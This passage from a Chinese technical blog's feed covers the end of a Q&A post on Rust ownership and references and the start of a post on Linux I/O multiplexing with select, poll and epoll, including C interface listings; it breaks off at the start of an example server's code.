class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">len</span> = <span class="title function_ invoke__">calculate_length</span>(&amp;s1);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The length of &#x27;&#123;&#125;&#x27; is &#123;&#125;.&quot;</span>, s1, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">calculate_length</span>(s: &amp;<span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">usize</span> &#123;</span><br><span class="line">    s.<span class="title function_ invoke__">len</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答：因为 <code>&amp;String</code> Rust 引用不会传递所有权。在 <code>calculate_length</code> 结束后，编译器知道所有权（释放的责任）不在局部变量 <code>s</code> 这里，就不会释放它；</p><p>所有权仍然位于 <code>s1</code>，因此只有 <code>main</code> 结束（<code>s1</code> 生命周期结束），编译器才会去释放 <code>s1</code> 的堆上空间；</p><p><strong>Q2：为什么下面的例子无法通过编译？</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">change</span>(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">change</span>(some_string: &amp;<span class="type">String</span>) &#123;</span><br><span class="line">    some_string.<span class="title function_ invoke__">push_str</span>(<span class="string">&quot;, world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答：因为 Rust 引用根据变量的可变性作出区分。更改不可变引用就破坏了 Rust 作出的数据安全假设。</p><p><strong>Q3：为什么可变引用同时只能存在一个？</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r1</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r2</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line"><span class="comment">// 错误</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>, r1, r2);</span><br></pre></td></tr></table></figure><p>答：虽然 Rust 引用不传递所有权，但是多个可变引用在并发场景相当于共享资源多写者，破坏了 Rust 的数据安全假设。</p><p><strong>Q4：为什么可变引用和不可变引用不能同时存在？</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r1</span> = &amp;s;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r2</span> = &amp;s;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r3</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line"><span class="comment">// 错误</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;, and &#123;&#125;&quot;</span>, r1, r2, r3);</span><br></pre></td></tr></table></figure><p>答：同 Q3。这是并发场景共享资源临界区同时存在写者和读者，破坏了 Rust 数据安全假设。</p><p><strong>Q5：为什么这样的写法又可以？</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r1</span> = &amp;s;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r2</span> = &amp;s;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r3</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line"><span class="comment">// 正确</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, r3);</span><br></pre></td></tr></table></figure><p>答：在新版 Rust 编译器中，默认使用 Liveness Analysis 进行 Dead Code Elimination。<code>r1</code> 和 <code>r2</code> 的生命周期只有定义的一行。到定义 <code>r3</code> 时，<code>r1/r2</code> 已经死亡了。如果读者了解过编译原理，这很容易可以看出。</p><p><strong>Q6：为什么这样的引用无法通过编译？</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">reference_to_nothing</span> = <span class="title function_ invoke__">dangle</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">dangle</span>() <span class="punctuation">-&gt;</span> &amp;<span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &amp;s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答：这里和 C/C++ 有很大不同。虽然 <code>s</code> 创建在堆上，但是请记住回收是交给编译器完成的，而编译器是将回收动作和变量生命周期绑定的。</p><p>也就是说，<code>s</code> 作为一个局部变量，在函数返回后生命周期就会结束，编译器会释放掉 <code>s</code> 涉及的堆空间。这个效果就和 C/C++ 返回指向函数栈上的局部变量的指针一样。</p><p>总的来说，Rust 这么做就是为了方便追踪变量的释放责任（所有权），方便判断恰当的释放时机。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对 C/C++ 开发者，总结一下：</p><ul><li><p>Rust 的所有权管理的是堆上的数据。本质上是通过所有权机制，让编译器帮你管理堆上的空间，不需手动分配和释放堆空间、不需 GC；</p><blockquote><p>也就是：只在编译期完成所有内存分配、释放的规则的制定。</p></blockquote></li><li><p>所有实现 <code>Copy</code> traits 的类型，都是代表可以安全进行值拷贝的类型。例如不含指针域的定长简单复合类型、基本类型。</p><ul><li><code>Copy</code> traits 类比为 C++ 中的默认复制构造方法，隐式调用。</li></ul></li><li><p>其他复合类型（一般是含有指针域的），在 rust 中都不能实现 <code>Copy</code> trait，因为可能隐式复制构造会造成指针共享，破坏了 rust 的所有权机制。</p></li><li><p>Rust 函数传参和 C++ 相同，默认值传递（无论是什么类型），除非显式使用引用记号（<code>&amp;T / &amp;mut T</code>，即 Rust 引用）；</p><ul><li>需注意 Rust 对数据竞争的安全性要求；</li><li>需注意可变引用没有 Copy Trait，因此它本身就被所有权管理；</li><li>需注意引用的生命周期，防止冲突。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;笔者在一开始了解 Rust 的内存管理机制的时候，阅读了官方文档，以及网络上的教科书，它们首先都引入了所谓 “所有权” 和 “借用” 的概念。&lt;/p&gt;
&lt;p&gt;笔者认为这样的叙述方法非常合适，特别是如果读者对操作系统原理与实现、C/C++ 语言不了解，那么这么讲授的方法是大概</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="C++" scheme="https://blog.sjtuxhw.top/tags/C/"/>
    
    <category term="Rust" scheme="https://blog.sjtuxhw.top/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>更多的 I/O 多路复用</title>
    <link href="https://blog.sjtuxhw.top/review/io-mul-more/"/>
    <id>https://blog.sjtuxhw.top/review/io-mul-more/</id>
    <published>2025-04-01T04:13:25.000Z</published>
    <updated>2025-04-17T15:47:17.555Z</updated>
    
    <content type="html"><![CDATA[<p>最近总结了一些 OS I/O 多路复用的知识。之前对 I/O Multiplexer 的认知还停留在 <code>select</code> 系统调用，现在是时候扩展一下视野了。</p><h3 id="1-从-Socket-模型开始"><a href="#1-从-Socket-模型开始" class="headerlink" title="1. 从 Socket 模型开始"></a>1. 从 Socket 模型开始</h3><p>Socket 作为一个应用层和传输层间的的抽象，支持网络层 IPv4 / IPv6，以及传输层 TCP / UDP。</p><p>双方要进行网络通信前，各自需要创建一个 Socket。</p><p>如果是基于 UDP 的套接字：</p><p><img src="imgs/udp-socket.png" width="350px" /></p><p>如果是基于 TCP 的套接字：</p><p><img src="imgs/tcp-socket.png" width="450px" /></p><p>以基于 TCP 的套接字为例，首先使用 <code>socket()</code> 创建一个网络协议为 IPv4，以及传输协议为 TCP 的 Socket 结构体，然后使用 <code>bind()</code> 绑定 Server IP 和进程服务端口 port，并监听 <code>listen()</code> 在该端口上（<code>listen</code> 仅改变状态）；</p><blockquote><p>之所以需要指定 Server IP，是因为一台机器是可以有多个网卡的，每个网卡都有对应的 IP 地址。Socket 允许指定监听的网卡。<code>0.0.0.0</code> 表示监听所有的 network interfaces；</p><p>port 即为传输层信息，对应指定线程的服务。</p></blockquote><p>Server 端 socket 进入监听状态后，调用阻塞函数 <code>accept()</code>，来从内核获取客户端的连接，如果没有客户端连接，则会阻塞等待客户端连接的到来。</p><p>如果客户端使用 <code>connect()</code> 发起连接后，双方会进行 TCP 3 次握手。在连接过程中，server 端 OS kernel 会为每个 socket 都维护两个队列：</p><ul><li>一个是 “还没完全建立” 连接的队列，称为 <strong>TCP 半连接队列</strong>（服务端 socket 处于 <code>syn_rcvd</code> 状态）；</li><li>另一个是 “已经建立” 连接的队列，称为 <strong>TCP 全连接队列</strong>，这个队列都是完成了三次握手的连接（此时服务端处于 <code>established</code> 状态）；</li></ul><p>当全连接队列不为空时，内核会拿出一个已连接的 socket（称为 <strong>已连接 socket</strong>）并响应任意一个阻塞在 <code>accept()</code> 上的服务端线程，此时该服务线程会使用这个已连接的 socket 来响应客户端（一般会新开一个进程/线程/使用其他方案来处理）。</p><blockquote><p>注意，<code>accept()</code> 第一参数是<strong><u>监听 socket 的文件描述符</u></strong>，返回的是<strong><u>已连接 socket 的文件描述符</u></strong>，它们不一样。因为考虑多线程情况，<code>accept</code> 放在一个循环里，这个监听 socket 专门用于接收连接请求。</p></blockquote><h3 id="2-提升-Socket-服务能力：为什么选择-I-O-多路复用"><a href="#2-提升-Socket-服务能力：为什么选择-I-O-多路复用" class="headerlink" title="2. 提升 Socket 服务能力：为什么选择 I/O 多路复用"></a>2. 提升 Socket 服务能力：为什么选择 I/O 多路复用</h3><p>那么一般情况服务端应该怎么做来处理大量的 socket 连接请求？</p><p>前面说过，服务端可以新开一个进程来处理客户端连接，但每次 <code>fork()</code> 创建新进程（包括完整的虚拟内存空间、CPU 寄存器、内核数据结构如文件描述符等等）、进程间上下文切换的时间开销非常大。并且父进程需要通过 <code>wait/waitpid</code> 来回收子进程资源。更重要的是，内存空间资源也不一定足够，这在大量快速并发的场景并不切实际。</p><p>如果服务端新开一个线程来处理客户端连接，性能和其他资源紧张情况应该好于多进程实现。同一进程的线程间会共享文件描述符表、页表、所在进程的所有信息、全部的用户态空间等等，因此同进程间线程上下文开销大大减小。</p><p>为了应对线程频繁创建和销毁的情况，我们还可以通过维护线程池来缓解这个情况。</p><p>但本质上，过多的进程 / 线程最终会把压力交给操作系统。OS 想要同时管理、调度上万个进程/线程，势必会导致 OS 不堪重负（考虑调度）。</p><p>在这种场景下我们就需要使用 I/O 多路复用技术，让一个进程能够维护多个 socket。</p><h4 id="select-amp-poll"><a href="#select-amp-poll" class="headerlink" title="select &amp; poll"></a>select &amp; poll</h4><p>我们最先了解，也是最简单的 I/O 多路复用是 <code>select</code> 方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该函数会阻塞监听指定的 readfds 列表中所有文件，直至列表中任一个文件能够被 read（不是 EOF）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param[in] maxfd 最大监听的数量（`readfds` 有几个 bit 位）</span></span><br><span class="line"><span class="comment"> * @param[in/out] readfds 所有要监听的 file descriptor 列表（每个 bit 代表对对应的 fd 进行监听），最大默认 `FD_SET_SIZE` bits；</span></span><br><span class="line"><span class="comment"> *      也是结束监听时能读 fd 的返回值。</span></span><br><span class="line"><span class="comment"> * 只需要了解前两个参数，后面 3 个配置参数一般填 NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> nfds, fd_set *_Nullable <span class="keyword">restrict</span> readfds,</span></span><br><span class="line"><span class="params">          fd_set *_Nullable <span class="keyword">restrict</span> writefds,</span></span><br><span class="line"><span class="params">          fd_set *_Nullable <span class="keyword">restrict</span> exceptfds,</span></span><br><span class="line"><span class="params">          <span class="keyword">struct</span> timeval *_Nullable <span class="keyword">restrict</span> timeout)</span>;</span><br><span class="line"><span class="comment">/* clear all bits in fdset. */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_ZERO</span><span class="params">(fd_set *fdset)</span>;</span><br><span class="line"><span class="comment">/* clear bit fd in fdset */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_CLR</span><span class="params">(<span class="type">int</span> fd, fd_set *fdset)</span>;</span><br><span class="line"><span class="comment">/* turn on bit fd in fdset */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">FD_SET</span><span class="params">(<span class="type">int</span> fd, fd_set *fdset)</span>;</span><br><span class="line"><span class="comment">/* Is bit fd in fdset on? */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">FD_ISSET</span><span class="params">(<span class="type">int</span> fd, *fdset)</span>;</span><br></pre></td></tr></table></figure><p>处理已连接 socket 的线程，将已连接的并且感兴趣的 socket 放到文件描述符集合（FD set，也就是上面的 bitmap）中，然后调用 <code>select</code> 函数将文件描述符集合<strong><u>复制</u></strong>到到内核里，让内核来检查是否有网络事件产生。</p><p>内核检查的方式很 naive，就是遍历这个文件描述符集合，当内核发现有网络事件发生后（例如客户端回复），在将对应的 socket 改为可读/可写，把更新状态的文件描述符表再次复制回用户态，用户态再通过遍历方式找到可读/可写的 socket 再进行对应操作。</p><p>我们发现 <code>select</code> 有几个问题：</p><ul><li>整个过程比较低效（<strong><u>两次遍历、两次复制</u></strong>），涉及多次 kernel 和 user 间的 memory copy 以及上下文切换；</li><li>并且访问文件描述符表的时间复杂度是线性的（$O(n)$）；</li><li>由于使用固定大小的 bitmap，受到内核中的 <code>FD_SETSIZE</code> 限制， 默认最大值为 1024，只能监听 0~1023 的文件描述符。</li></ul><p>那么 <code>poll</code> 函数呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>   fd;         <span class="comment">/* file descriptor */</span></span><br><span class="line">    <span class="type">short</span> events;     <span class="comment">/* requested events */</span></span><br><span class="line">    <span class="type">short</span> revents;    <span class="comment">/* returned events */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">poll</span><span class="params">(<span class="keyword">struct</span> pollfd *fds, <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure><p>同样是在 <code>fds</code> 中任意一个文件描述符准备完成 / 超时 / 信号打断。只不过 <code>poll</code> 支持精确到事件类别的控制（<code>events/revents</code>）。</p><p>它和 <code>select</code> 一样访问模式类似，但是不一样的是，<code>poll</code> 不再用 bitmap 来存储所关注的文件描述符，取而代之<strong><u>用动态数组（以链表形式）来组织</u></strong>，突破了 select 的文件描述符个数限制，当然还会受到系统文件描述符限制。不过仍然是线性访问时间、低效的检查过程。</p><p>因此在高并发的情况 <code>select</code> 和 <code>poll</code> 的性能还是不足够的。</p><h4 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h4><p>这个系统调用是 Unix 专属的，一般情况下它的使用涉及接口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> &#123;</span></span><br><span class="line">   <span class="type">uint32_t</span>      events;  <span class="comment">/* Epoll events */</span></span><br><span class="line">   <span class="type">epoll_data_t</span>  data;    <span class="comment">/* User data variable */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">epoll_data</span> &#123;</span></span><br><span class="line">   <span class="type">void</span>     *ptr;</span><br><span class="line">   <span class="type">int</span>       fd;</span><br><span class="line">   <span class="type">uint32_t</span>  u32;</span><br><span class="line">   <span class="type">uint64_t</span>  u64;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">epoll_data</span>  <span class="title">epoll_data_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建一个新的 epoll 实例</span></span><br><span class="line"><span class="comment"> * @param[in] size 原本用作给内核一个分配数据结构大小的提示。现在已不需要，主要是保持兼容性</span></span><br><span class="line"><span class="comment"> * @return 属于新的 epoll 实例的文件描述符。是接下来对 epoll 接口操作指代该 epoll 的符号（epfd）</span></span><br><span class="line"><span class="comment"> * @warning 所有 epoll_create 返回的 epfd 都需要手动回收（close()）！</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_create</span><span class="params">(<span class="type">int</span> size)</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * epoll 实例的感兴趣的 socket fd 列表维护在 Kernel 中。用户态需要这个控制函数来增添/修改/删除对指定 socket 文件的监听。</span></span><br><span class="line"><span class="comment"> * @param[in] epfd 当前 epoll 实例对应的文件描述符</span></span><br><span class="line"><span class="comment"> * @param[in] op 可选操作：EPOLL_CTL_ADD / EPOLL_CTL_MOD / EPOLL_CTL_DEL</span></span><br><span class="line"><span class="comment"> * @param[in] fd 需要被操作的 socket 文件描述符</span></span><br><span class="line"><span class="comment"> * @param[in] event.events 可选事件：EPOLLIN (readable) / EPOLLOUT (writable) / EPOLLRDHUP (peer close conn)</span></span><br><span class="line"><span class="comment"> *                                     / EPOLLET (边缘触发。不指定则默认水平触发)</span></span><br><span class="line"><span class="comment"> * @return 0 if sucess (otherwise -1 + set errno)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_ctl</span><span class="params">(<span class="type">int</span> epfd, <span class="type">int</span> op, <span class="type">int</span> fd,</span></span><br><span class="line"><span class="params">             <span class="keyword">struct</span> epoll_event *_Nullable event)</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 等待 epoll 实例中指定发生事件类型的可用文件描述符</span></span><br><span class="line"><span class="comment"> * @param[out] events 返回当前事件信息和对应的文件描述符列表</span></span><br><span class="line"><span class="comment"> * @param[in] maxevents 传入 events buffer 能盛放的最大 epoll_event 结构体的个数</span></span><br><span class="line"><span class="comment"> * @return 返回 ready 的文件描述符数量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_wait</span><span class="params">(<span class="type">int</span> epfd, <span class="keyword">struct</span> epoll_event events[.maxevents],</span></span><br><span class="line"><span class="params">              <span class="type">int</span> maxevents, <span class="type">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure><p>一般使用方法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">bind(s, ...);</span><br><span class="line">listen(s, ...);</span><br><span class="line"><span class="type">int</span> epfd = epoll_create(...);</span><br><span class="line"><span class="comment">// 将所有需要监听的 socket 添加到 epfd 中</span></span><br><span class="line">epoll_ctl(epfd, ...);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">int</span> n = epoll_wait(...);</span><br><span class="line">    <span class="keyword">for</span> (接收到数据的 socket) &#123;</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>epoll 相较于 select 和 poll 有重要的优势：</p><ul><li><p>epoll 在内核中使用<strong><u>红黑树</u></strong>来跟踪进程所有已注册（通过 <code>epoll_ctl</code>）的文件描述字。</p><ul><li>少两次文件描述符 copy，减少内存分配：不需要整体对文件描述符表进行复制（放在内核管理）；</li><li>管理性能增强：增删改复杂度 $O(\log n)$，一般<strong><u>不需要查找</u></strong>、取出平均复杂度可以到达常数时间（因为事件驱动）！</li></ul></li><li><p>使用<strong><u>事件驱动</u></strong>机制：</p><ul><li><p>在内核中维护链表记录就绪事件。有网络事件就把 ready sockets 放到 kernel space 的链表中（因此是常数时间的）；</p></li><li><p>调用 <code>epoll_wait</code> 时，如果链表非空，直接复制给 user space 提供的 buffer（抱歉，没法使用共享内存，还是需要 copy）；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// epoll wait 部分源码</span></span><br><span class="line"><span class="keyword">if</span> (revents) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__put_user(revents, &amp;uevent-&gt;events)</span><br><span class="line">       || __put_user(epi-&gt;event.data, &amp;uevent-&gt;data)) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>这大大增强了 <code>epoll</code> API 的并发能力。</p><h4 id="epoll-的边缘触发和水平触发（ET-amp-LT）"><a href="#epoll-的边缘触发和水平触发（ET-amp-LT）" class="headerlink" title="epoll 的边缘触发和水平触发（ET &amp; LT）"></a>epoll 的边缘触发和水平触发（ET &amp; LT）</h4><p>在学习数字电子电路的时候老师一定和你说过，某些电子元件的触发方式，其中就讨论过边缘触发和水平触发。</p><ul><li>水平触发的意思是只要满足事件的条件，比如内核中有数据需要读，就一直不断地把这个事件通知用户（例如保持某个全局 flag 一直有效）；</li><li>边缘触发的意思是只有第一次满足条件的时候才触发，之后就不会再传递同样的事件了。</li></ul><p><code>epoll_ctl</code> 可以默认使用水平触发，向 <code>event.events</code> 追加 <code>EPOLLET</code> 则表示使用边缘触发。在 epoll 中，考虑一个场景：一个文件描述符上有数据可读（EPOLLIN 触发），线程开始处理数据，而在处理过程中又有新数据加入。那么：</p><ul><li><p>如果是边缘触发：<strong>当旧数据开始处理时，文件描述符仍然保持在就绪状态。但当有新的数据写入时，文件描述符会从就绪状态变为未就绪状态，然后再次变为就绪状态，触发一次新的 EPOLLIN 事件</strong>；</p><p>这种模式下我们应该：使用循环 <code>read</code> 这个 fd 中的内容直至这个 read 返回错误 <code>(errno == EAGAIN) || (errno == EWOULDBLOCK)</code>。</p><blockquote><p>这样可以确保即使在旧数据处理过程中有新的数据写入，应用程序也能及时地得到通知，并读取新的数据。</p><p>考虑一个问题，多线程场景下，使用边缘触发可能有问题：因为存在唤醒多个线程的问题。如果不希望多个线程同时操作 socket，就应该使用 <code>EPOLLONESHOT</code>，表示 one-shot，即特定的 socket fd 事件只会触发一次，然后立即移除。如果获得消息的线程以后还想接收这个 socket 的事件，需要使用 <code>epoll_ctl</code> 的 <code>EPOLL_CTL_MOD</code> 重新注册。</p></blockquote><p>如果使用边缘触发，则不能使用阻塞 I/O，并且一个信号必须读到不能再读为止（<code>EAGAIN/EWOULDBLOCK</code>），因为：</p><p>如果没有读完所有内容，则会导致下次调用 <code>epoll_wait</code> 时不会再收到之前消息的通知，通知信息会丢失！</p><p>如果使用了阻塞 I/O，那么在没有通知的情况下会永远等待下去！</p></li><li><p>如果是水平触发：当某个文件描述符上有数据可读，应用程序可以不立即处理完毕该事件。这样，因为当程序下一次调用 <code>epoll_wait</code> 时，<code>epoll_wait</code> 还会向应用程序通知此事件，直到事件被处理完毕。即：<strong>如果文件描述符上有数据可读，它的状态码会一直保持就绪状态，直到所有的数据都被读取完毕才会变为未就绪</strong>；</p><p>这种模式性能会略差于边缘触发。</p></li></ul><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>尝试一下，用 C 写一个简单的 epoll 驱动的 server：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 